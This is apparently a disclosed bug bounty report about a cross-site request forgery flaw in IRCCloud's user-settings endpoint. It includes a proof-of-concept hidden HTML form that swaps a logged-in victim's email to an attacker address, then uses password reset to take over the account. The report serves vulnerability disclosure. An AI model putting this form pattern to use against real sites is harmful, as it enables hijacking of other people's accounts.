# HackerOne Report: Full account takeover using CSRF and password reset
**Report ID:** 6910
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
An attacker could take over any user account by doing the following things.

1) Exploit a CSRF vulnerability in `/chat/user-settings`.  An attacker creates a webpage on a (non-IRCCloud) website (for example: http://example.com/cat.html) and inserts a (hidden) form like this:

    <form action="https://www.irccloud.com/chat/user-settings" method="post">
    <input type="hidden" name="email" value="hacker@example.com">
    <input type="hidden" name="realname" value="Doesn't Matter">
    <input type="hidden" name="hwords" value="">
    <input type="hidden" name="autoaway" value="1">
    <input type="hidden" name="reqid" value="1">
    <input type="hidden" name="session" value="">
    <input type="submit"> 
    <!-- some code to make the form submit automatically, in the  background-->
    </form>

2) The attacker will send a link to the page to the victim. When the victim is logged in to IRCCloud, and clicks the link to the page, the e-mail of the victim on IRCCloud will be updated (in the background) to `hacker@example.com`.

3) The attacker will receive an e-mail to confirm the e-mail address (see: mail.png).

4) The attacker can now use the password reset functionality to change the password of the victim's account and gain full control over the account.

## Discussion & Remediation Timeline
